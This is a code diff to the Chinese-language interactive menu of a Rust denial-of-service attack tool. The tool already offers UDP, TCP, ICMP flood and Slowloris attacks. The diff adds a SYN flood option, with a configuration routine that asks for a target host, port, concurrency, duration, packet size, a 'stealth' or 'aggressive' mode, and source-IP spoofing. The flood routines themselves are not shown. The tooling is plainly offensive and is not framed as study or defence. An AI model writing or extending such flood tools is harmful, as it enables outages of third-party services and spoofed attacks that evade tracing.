@@ -1,4 +1,4 @@
-use crate::{AttackConfig, UdpFloodConfig, TcpFloodConfig, IcmpFloodConfig, SlowlorisConfig, AppConfig};
+use crate::{AttackConfig, UdpFloodConfig, TcpFloodConfig, IcmpFloodConfig, SlowlorisConfig, SynFloodConfig, AppConfig};
 use std::io::{self, Write};
 
 pub async fn start_interactive_mode() {
@@ -17,10 +17,11 @@ pub async fn start_interactive_mode() {
         println!("3. TCP 洪水攻击");
         println!("4. ICMP 洪水攻击");
         println!("5. Slowloris 攻击");
-        println!("6. 退出");
+        println!("6. SYN 洪水攻击");
+        println!("7. 退出");
         println!();
 
-        print!("请输入选择 (1-6): ");
+        print!("请输入选择 (1-7): ");
         io::stdout().flush().unwrap();
 
         let mut choice = String::new();
@@ -54,6 +55,11 @@ pub async fn start_interactive_mode() {
                 }
             }
             "6" => {
+                if let Some(config) = get_syn_config(&app_config) {
+                    crate::syn_flood::run_syn_flood(config).await;
+                }
+            }
+            "7" => {
                 println!("👋 再见！");
                 break;
             }
@@ -533,5 +539,79 @@ fn get_slowloris_config(app_config: &AppConfig) -> Option<SlowlorisConfig> {
         random_headers,
         min_interval,
         max_interval,
+    })
+}
+
+fn get_syn_config(app_config: &AppConfig) -> Option<SynFloodConfig> {
+    println!("\n🌊 SYN洪水攻击配置");
+    println!("===================");
+
+    // 目标
+    print!("目标IP/域名: ");
+    io::stdout().flush().unwrap();
+    let mut target = String::new();
+    io::stdin().read_line(&mut target).unwrap();
+    let target = target.trim().to_string();
+
+    if target.is_empty() {
+        println!("❌ 目标不能为空");
+        return None;
+    }
+
+    // 端口
+    print!("端口 (默认80): ");
+    io::stdout().flush().unwrap();
+    let mut port = String::new();
+    io::stdin().read_line(&mut port).unwrap();
+    let port = port.trim().parse::<u16>().unwrap_or(80);
+
+    // 并发数
+    print!("并发连接数 (默认{}): ", app_config.default_syn_connections);
+    io::stdout().flush().unwrap();
+    let mut connections = String::new();
+    io::stdin().read_line(&mut connections).unwrap();
+    let connections = connections.trim().parse::<usize>().unwrap_or(app_config.default_syn_connections);
+
+    // 持续时间
+    print!("持续时间(秒) (默认{}): ", app_config.default_duration);
+    io::stdout().flush().unwrap();
+    let mut duration = String::new();
+    io::stdin().read_line(&mut duration).unwrap();
+    let duration = duration.trim().parse::<u64>().unwrap_or(app_config.default_duration);
+
+    // 数据包大小
+    print!("数据包大小(字节) (默认{}): ", app_config.default_packet_size);
+    io::stdout().flush().unwrap();
+    let mut packet_size = String::new();
+    io::stdin().read_line(&mut packet_size).unwrap();
+    let packet_size = packet_size.trim().parse::<usize>().unwrap_or(app_config.default_packet_size);
+
+    // 攻击模式
+    print!("攻击模式 (normal/stealth/aggressive, 默认{}): ", app_config.default_mode);
+    io::stdout().flush().unwrap();
+    let mut mode = String::new();
+    io::stdin().read_line(&mut mode).unwrap();
+    let mode = mode.trim().to_lowercase();
+    let mode = if mode.is_empty() || (mode != "normal" && mode != "stealth" && mode != "aggressive") {
+        app_config.default_mode.clone()
+    } else {
+        mode
+    };
+
+    // 伪造源IP
+    print!("伪造源IP? (y/N): ");
+    io::stdout().flush().unwrap();
+    let mut spoof_ip = String::new();
+    io::stdin().read_line(&mut spoof_ip).unwrap();
+    let spoof_ip = spoof_ip.trim().to_lowercase() == "y";
+
+    Some(SynFloodConfig {
+        target,
+        port,
+        connections,
+        duration,
+        packet_size,
+        mode,
+        spoof_ip,
     })
 } 
